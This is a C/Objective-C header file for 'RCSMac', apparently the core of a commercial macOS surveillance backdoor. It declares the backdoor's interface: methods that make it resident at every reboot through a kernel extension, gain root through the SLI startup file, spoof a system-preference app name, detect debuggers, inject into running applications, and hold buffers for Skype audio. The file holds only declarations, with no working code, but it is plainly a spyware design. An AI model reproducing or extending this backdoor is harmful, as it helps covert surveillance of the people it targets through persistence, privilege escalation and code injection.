/*
 * RCSMac - Core Header
 * 
 * Created by Alfredo 'revenge' Pesoli on 16/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMCore_h__
#define __RCSMCore_h__

#import "RCSMUtils.h"
#import "RCSMSharedMemory.h"

//
// Available modes for our backdoor
//  mode: Ah57K set by "require admin privileges"
//        Ah56K set by no "require admin privileges" flagged
//
#define SLIPLIST @"Ah56K"
#define UISPOOF  @"Ah57K"
#define DYLIB    @"Ah58K"
#define DEV      @"Ah59K"


@class __m_MLogManager;

@interface __m_MCore : NSObject
{
@private
  // backdoor ID returned by our kext -- not used as of now
  //int mBackdoorID;
  // advisory lock descriptor -- not used as of now.
  //int mLockFD;
  
@private
  // backdoor executable binary name
  NSString *mBinaryName;
  // backdoor app bundle name (without .app)
  NSString *mApplicationName;
  
  // path to spoofed app name (system pref)
  NSString *mSpoofedName;
  
@private
  NSString *mMainLoopControlFlag; // @"START" | @"STOP" | @"RUNNING"
  //BOOL mCanSyncThroughSafari;

@private
  NSMutableData *skypeInputData;
  NSMutableData *skypeOutputData;
}

@property (readwrite, retain) NSString *mBinaryName;
@property (readwrite, retain) NSString *mApplicationName;
@property (readwrite, retain) NSString *mSpoofedName;
@property (readwrite, retain) NSString *mMainLoopControlFlag;

- (id)init;
- (void)dealloc;

//
// Create the kext plist file to be used with launchctl in order to load the
// kext at every reboot.
// TODO: Check if we need to make the whole backdoor resident here or split
//        rootkit/backdoor
//
- (BOOL)makeBackdoorResident;
- (BOOL)isBackdoorAlreadyResident;
- (BOOL)runMeh;

//
// Init uspace<->kspace communication channel (ioctl MCHOOK_INIT)
// return backdoorID to be used for all the future operations (ioctl requests)
//
- (int)connectKext;

//
// Add the backdoor to the global SLI file in order to get root on the next
// reboot
//
- (BOOL)getRootThroughSLI;
- (void)UISudoWhileAlreadyAuthorized: (BOOL)amIAlreadyAuthorized;

//
// Threaded (always running) - true if the current process is being debugged
// (either running under the debugger or has a debugger attached post facto)
//
- (void)xfrth;

- (void)injectRunningApp;
- (void)injectBundle: (NSNotification *)notification;
- (void)sendEventToPid: (NSNumber *)thePid;
- (void)shareCorePidOnShMem;

@end

#endif
